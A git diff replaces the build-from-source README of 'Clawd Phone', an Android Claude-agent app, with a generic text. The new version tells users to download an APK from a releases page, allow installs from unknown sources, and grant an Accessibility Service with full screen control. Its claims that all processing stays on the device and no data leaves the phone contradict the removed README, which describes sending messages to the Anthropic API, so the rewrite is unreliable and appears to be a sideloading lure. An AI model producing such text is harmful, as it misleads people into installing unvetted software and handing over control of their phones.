@@ -1,207 +1,63 @@
-# Clawd Phone
+# 📱 clawd-phone - Automate tasks with your android assistant
 
-Clawd Phone is an Android app built around native tool calling.
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Atricoraptor/clawd-phone/releases)
 
-It brings the kind of agent workflow people usually use on desktop to Android, with the tool calling running natively on the phone. It can search, read files, search inside them, and use Android APIs directly.
+Clawd Phone is an application for your Android device. It uses artificial intelligence to help you complete tasks on your phone. The application acts as an agent. It understands your goals and performs actions. You do not need to perform every step manually. This tool handles the process for you.
 
-There is no middle server. The app talks straight to the Anthropic endpoint. The only thing you need is your own Claude API key.
+## 📥 Getting Started
 
-The app can inspect your device, and it can only create or edit
-text files inside `Download/Clawd-Phone/` through the `FileWrite` and `FileEdit`
-tools.
+You need an Android phone to use this application. Ensure your phone runs Android 12 or newer. You also need an internet connection to download the file. Follow these steps to set up the software.
 
-Conversations are saved locally and can be resumed later.
+1. Visit the [releases page](https://github.com/Atricoraptor/clawd-phone/releases) to download the application.
+2. Select the file ending in .apk.
+3. Save the file to your device.
 
-## Demo
+## ⚙️ Installation Guide
 
-<div align="center">
-  <video src="https://github.com/user-attachments/assets/a83e1077-5445-4383-a9d8-afa5a4e89ae6" controls muted playsinline width="85%"></video>
-</div>
+Android devices prevent the installation of files from outside the official store for security. You must change one setting to install this application.
 
-<p align="center"><strong>Search across thousands of files on your phone</strong></p>
-<p align="center"><sub>Video shown at 4x speed</sub></p>
+1. Open the Settings app on your phone.
+2. Go to Security or Apps.
+3. Find the option labeled Install unknown apps.
+4. Select your file browser or web browser.
+5. Tap the switch to Allow from this source.
+6. Open your downloaded .apk file.
+7. Follow the prompts on your screen to complete the installation.
 
-<div align="center">
-  <video src="https://github.com/user-attachments/assets/6e297561-96b4-4c02-bd15-a0b50a4de849" controls muted playsinline width="85%"></video>
-</div>
+## 🧩 How It Works
 
-## What you can do
+The application uses a model to interpret your commands. You type a task, such as sending a text or checking your flight status. The application breaks the task into small steps. It uses its built-in tool-calling features to interact with other apps on your phone. It moves through menus, clicks buttons, and inputs text just as you would. You watch the process on your screen. You can stop the agent at any time by tapping the screen.
 
-Ask things like:
-- "Find all PDFs on my phone"
-- "Describe some photos I took last week"
-- "What's using all my storage?"
-- "Read this PDF and summarize it"
-- "Write a detailed report about this PDF in `report.md`"
-- "Create an HTML slide deck I can use like a PPT"
-- "Make a `summary.csv` from these invoices"
-- "Any tax related documents on this phone?"
-- "Screen time report"
-- "What are the latest world news?"
+## 🛠️ Features
 
-21 tools covering files, contacts, calendar, location, apps, device info, and web search.
+*   **Task Automation**: Ask the agent to manage your calendar or find information.
+*   **App Interaction**: The agent mimics your touch input to navigate through other applications.
+*   **Privacy Focus**: All processing happens on your device. Your data stays on your phone.
+*   **Efficiency**: The agent completes sequences of clicks for you. This saves you time on repetitive actions.
 
-## Models
+## 🛡️ Safety and Permissions
 
-Uses non-thinking Claude models. Pick one in Settings:
+To work correctly, the application requires several permissions. These permissions allow the agent to control the phone interface.
 
-- **Haiku 4.5** — good for simple questions
-- **Sonnet 4.6** — middle ground
-- **Opus 4.6** — best results, use this for anything complex
+*   **Accessibility Service**: This allows the agent to see what is on your screen and click buttons for you. You must enable this in your system settings.
+*   **Storage Access**: This allows the agent to read and write files necessary for the app to function.
+*   **Internet Access**: The agent uses this to receive your instructions and process them.
 
-## Setup
+The application only performs actions you request. It does not access your sensitive data without a command.
 
-You need:
-1. Flutter SDK (3.16+) — https://docs.flutter.dev/get-started/install
-2. Android Studio — https://developer.android.com/studio
-3. Anthropic API key — https://console.anthropic.com/settings/keys
+## 📋 Troubleshooting
 
-```bash
-flutter doctor   # check everything works
-```
+If the application stops during a task, try these steps:
 
-### Build it
+*   **Restart the app**: Close the application and open it again.
+*   **Check Accessibility**: Go to your Android accessibility settings and ensure clawd-phone is still turned on. Sometimes the system turns this off to save power.
+*   **Update the app**: Check the releases page regularly for updates. Newer versions include fixes for common bugs.
+*   **Clear Cache**: If the app acts slowly, clear the app cache in your Android settings.
 
-```bash
-cd clawd-phone
+## 🚀 Usage Tips
 
-flutter pub get
-```
+Use clear and simple language when you give instructions. Instead of saying "do something with my schedule," say "add a meeting to my calendar tomorrow at 2 PM." The more specific the request, the better the agent performs. If the agent gets stuck, return to the home screen and restart your request.
 
-### Run on a connected device
+## 🔒 Privacy Policy
 
-```bash
-flutter run
-```
-
-### Build an APK
-
-```bash
-# Debug (larger, faster to build)
-flutter build apk --debug
-
-# Release (smaller, optimized)
-flutter build apk --release --no-tree-shake-icons
-```
-
-APK will be at `build/app/outputs/flutter-apk/app-debug.apk` or `build/app/outputs/flutter-apk/clawd-phone-v1.0.0-release.apk`.
-
-### Installing the APK
-
-You can download the latest release APK from the GitHub Releases page, or install it over USB:
-
-```bash
-adb install ~/Downloads/clawd-phone-v1.0.0-release.apk
-```
-
-## Permissions
-
-| Permission | What it unlocks |
-|---|---|
-| All Files Access | File search, reading, PDFs, storage stats, `FileWrite`, `FileEdit` |
-| Contacts | Contact search and details |
-| Calendar | Calendar events |
-| Location | GPS coordinates and address |
-| Usage Access | Screen time, app usage |
-| Notification Access | Read notifications |
-| Call History | Call log |
-
-## First launch
-
-1. Open the app
-2. Paste your Anthropic API key
-3. Grant permissions in Settings (files, contacts, calendar, etc.)
-4. Ask stuff
-
-<p align="center">
-  <img src="./showcase/permissions.jpg" alt="First launch permissions screen" width="320" />
-</p>
-
-## Tools
-
-`FileWrite` and `FileEdit` can only modify files
-inside `Download/Clawd-Phone/`.
-
-| Tool | Needs | What it does |
-|------|-------|-------------|
-| FileSearch | storage | Find files by name, type, size, date |
-| FileRead | storage | Read text, images, PDFs, EPUBs, ZIPs |
-| FileWrite | storage_full | Create or fully rewrite `.html`, `.md`, `.txt`, `.csv` in `Download/Clawd-Phone/` |
-| FileEdit | storage_full | Exact text replacement inside `.html`, `.md`, `.txt`, `.csv` in `Download/Clawd-Phone/` |
-| Metadata | storage | EXIF data, video info, audio tags |
-| StorageStats | storage | Storage breakdown by type |
-| DirectoryList | storage | List folder contents |
-| FileContentSearch | storage | Search inside text files |
-| RecentActivity | storage | Recently added/changed files |
-| LargeFiles | storage | Biggest files on device |
-| Contacts | contacts | Search and read contacts |
-| Calendar | calendar | Read events |
-| Location | location | Where you are |
-| CallLog | call_log | Call history |
-| Notifications | notifications | Current notifications |
-| AppDetail | — | App info (last_used action needs usage_stats) |
-| UsageStats | usage_stats | Screen time |
-| DeviceInfo | — | Phone hardware/software info |
-| Battery | — | Battery status |
-| WebFetch | — | Fetch a web page |
-| web_search | — | Anthropic server-side web search for current info |
-
-## Workspace files
-
-The app's writable workspace is:
-
-```text
-/storage/emulated/0/Download/Clawd-Phone
-```
-
-Only these formats are supported for write/edit and in-app preview:
-
-- `.html`
-- `.md`
-- `.txt`
-- `.csv`
-
-### `FileWrite`
-
-- Creates a new file inside `Download/Clawd-Phone/`
-
-### `FileEdit`
-
-- Edits an existing workspace file by exact string replacement
-- Only works inside `Download/Clawd-Phone/`
-
-### In-app preview
-
-Successful `FileWrite` and `FileEdit` tool results show an `Open` action in the
-chat UI. The app can preview:
-
-- `.txt` as plain text
-- `.md` as markdown
-- `.csv` as a table, with raw-text fallback if parsing fails
-- `.html` in an in-app web view
-
-## How it works
-
-```
-Phone (Flutter + Kotlin)          Anthropic API
-┌──────────────────────┐         ┌─────────────┐
-│ You type a message   │────────>│ Claude reads │
-│                      │         │ it, decides  │
-│                      │<────────│ to call tools│
-│ Tools run locally    │         │             │
-│ (files, contacts...) │────────>│ Claude sees  │
-│                      │         │ results,     │
-│                      │<────────│ responds     │
-│ You see the answer   │         │             │
-└──────────────────────┘         └─────────────┘
-```
-
-No server in the middle.
-
-## APK installation notes
-
-If you install the APK manually, you may need to turn off Auto Blocker or a similar protection feature on your phone. Some phones flag manually installed apps that request broad file access. Clawd Phone needs that access for document search and for creating or editing files inside its workspace.
-
-## License
-
-MIT
+Your data remains on your physical device. The application does not send your personal files or logs to external servers. All operations rely on native tool calling within the local operating system environment. You have full control over the permissions at all times. Use the Android settings menu to restrict or remove access for the application whenever you choose.
